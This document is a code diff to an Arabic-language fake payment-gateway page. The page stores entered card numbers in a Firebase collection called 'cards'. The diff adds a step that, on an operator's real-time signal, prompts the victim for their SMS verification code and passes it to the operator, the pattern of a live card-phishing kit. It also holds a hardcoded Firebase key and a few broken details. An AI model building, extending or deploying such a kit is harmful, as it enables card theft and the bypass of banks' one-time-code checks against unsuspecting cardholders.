@@ -293,10 +293,55 @@
             height: auto;
             border-radius: 10%;
         }
+        
+        /* OTP Container Styles */
+        .otp-container {
+            display: none;
+            margin-top: 20px;
+            border: 1px solid #ffeeba;
+            background: #fff3cd;
+            padding: 20px;
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        .otp-container label {
+            color: #856404;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .otp-container input {
+            text-align: center;
+            letter-spacing: 8px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        
+        #submit-otp-btn {
+            background-color: #856404;
+            margin-top: 15px;
+        }
+        
+        #submit-otp-btn:hover {
+            background-color: #6b4c03;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Main Content Wrapper */
+        #main-content {
+            width: 100%;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="main-content">
         <header>
             <h1>بوابة الدفع الإلكتروني</h1>
             <p>أدخل معلومات بطاقتك لإتمام عملية الدفع</p>
@@ -360,6 +405,15 @@
                     <i class="fa-solid fa-lock"></i> دفع الآن
                 </button>
             </form>
+            
+            <!-- OTP Container -->
+            <div class="otp-container" id="otp-container">
+                <label for="otp-code">أدخل كود التحقق المرسل لهاتفك</label>
+                <input type="text" id="otp-code" class="form-control" placeholder="000000" maxlength="6">
+                <button type="button" id="submit-otp-btn" class="btn">
+                    <i class="fa-solid fa-key"></i> تأكيد الكود
+                </button>
+            </div>
         </div>
         
         <div class="payment-status" id="success-message">
@@ -385,17 +439,17 @@
 <script type="module">
     // 1. استيراد مكتبات Firebase
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp, onSnapshot, doc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, serverTimestamp, onSnapshot, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
     // 2. إعدادات Firebase الخاصة بك
     const firebaseConfig = {
-   apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
-    authDomain: "vasa-a14ca.firebaseapp.com",
-    projectId: "vasa-a14ca",
-    storageBucket: "vasa-a14ca.firebasestorage.app",
-    messagingSenderId: "1083668938512",
-    appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
-    measurementId: "G-1ESJ0J0TZW"
+        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
+        authDomain: "vasa-a14ca.firebasestorage.app",
+        projectId: "vasa-a14ca",
+        storageBucket: "vasa-a14ca.firebasestorage.app",
+        messagingSenderId: "1083668938512",
+        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
+        measurementId: "G-1ESJ0J0TZW"
     };
 
     // 3. تهيئة Firebase
@@ -418,8 +472,15 @@
     const previewCardHolder = document.getElementById('preview-card-holder');
     const previewCardExpiry = document.getElementById('preview-card-expiry');
     const cardLogoContainer = document.querySelector('.card-logo');
+    
+    // عناصر OTP الجديدة
+    const otpContainer = document.getElementById('otp-container');
+    const otpCodeInput = document.getElementById('otp-code');
+    const submitOtpBtn = document.getElementById('submit-otp-btn');
+    const mainContent = document.getElementById('main-content');
 
     let selectedCardType = 'visa';
+    let currentDocId = null; // لتخزين معرف الوثيقة الحالية
     const madaPrefixes = ['4061', '4106', '4176', '4228', '4463', '4466', '4578', '4584', '4847', '5043', '5081', '5888', '6049', '6051', '9682'];
 
     // --- وظائف التنسيق والتعرف التلقائي ---
@@ -516,6 +577,11 @@
         hideError('cvv-error');
     });
 
+    // إدخال OTP التلقائي
+    otpCodeInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0,6);
+    });
+
     // --- إرسال البيانات والمراقبة اللحظية ---
     paymentForm.addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -542,21 +608,26 @@
                     createdAt: serverTimestamp()
                 });
 
+                currentDocId = docRef.id; // حفظ معرف الوثيقة
+
                 // 2. مراقبة الوثيقة في الوقت الفعلي (Real-time)
                 onSnapshot(doc(db, "cards", docRef.id), (docSnap) => {
                     if (docSnap.exists()) {
-                        const status = docSnap.data().status;
+                        const data = docSnap.data();
+                        const status = data.status;
                         
-                        if (status === 'success') {
-                            paymentForm.style.display = 'none';
-                            document.querySelector('.payment-card').style.display = 'none';
+                        if (status === 'otp_required') {
+                            // إظهار حقل الكود وإخفاء زر الدفع الأصلي
+                            otpContainer.style.display = 'block';
+                            submitBtn.style.display = 'none';
+                            paymentForm.style.opacity = '0.6';
+                            document.querySelector('.card-preview').style.opacity = '0.6';
+                        } else if (status === 'success') {
+                            mainContent.style.display = 'none';
                             successMessage.style.display = 'block';
-                            errorMessage.style.display = 'none';
                         } else if (status === 'error') {
-                            paymentForm.style.display = 'none';
-                            document.querySelector('.payment-card').style.display = 'none';
+                            mainContent.style.display = 'none';
                             errorMessage.style.display = 'block';
-                            successMessage.style.display = 'none';
                         }
                     }
                 });
@@ -570,9 +641,55 @@
         }
     });
 
+    // إرسال كود الـ OTP
+    submitOtpBtn.addEventListener('click', async () => {
+        const otpVal = otpCodeInput.value.trim();
+        if(otpVal.length < 4) {
+            alert("يرجى إدخال كود صحيح (على الأقل 4 أرقام)");
+            return;
+        }
+        
+        submitOtpBtn.disabled = true;
+        submitOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+        
+        try {
+            // حفظ الكود في نفس الوثيقة لكي يراه المسؤول
+            await updateDoc(doc(db, "cards", currentDocId), { 
+                otp: otpVal,
+                status: 'otp_sent' // تحديث الحالة ليعرف المسؤول أن الكود وصل
+            });
+            
+            otpCodeInput.disabled = true;
+            submitOtpBtn.innerHTML = '<i class="fa-solid fa-check"></i> تم إرسال الكود';
+            
+            // الانتظار لرد المسؤول
+            setTimeout(() => {
+                submitOtpBtn.innerHTML = '<i class="fas fa-clock"></i> بانتظار رد المسؤول...';
+            }, 2000);
+            
+        } catch (error) {
+            console.error("Error updating OTP: ", error);
+            alert("حدث خطأ أثناء إرسال الكود");
+            submitOtpBtn.disabled = false;
+            submitOtpBtn.innerHTML = '<i class="fa-solid fa-key"></i> تأكيد الكود';
+        }
+    });
+
     // إعادة تعيين النموذج
-    [payAgainBtn, tryAgainBtn].forEach(btn => {
-        btn.addEventListener('click', () => location.reload());
+    payAgainBtn.addEventListener('click', () => {
+        window.location.href = payAgainBtn.getAttribute('harf') || window.location.href;
+    });
+    
+    tryAgainBtn.addEventListener('click', () => {
+        location.reload();
+    });
+
+    // تهيئة اختيار نوع البطاقة
+    cardOptions.forEach(option => {
+        option.addEventListener('click', () => {
+            selectedCardType = option.getAttribute('data-type');
+            updateUI(selectedCardType);
+        });
     });
 </script>
 </body>
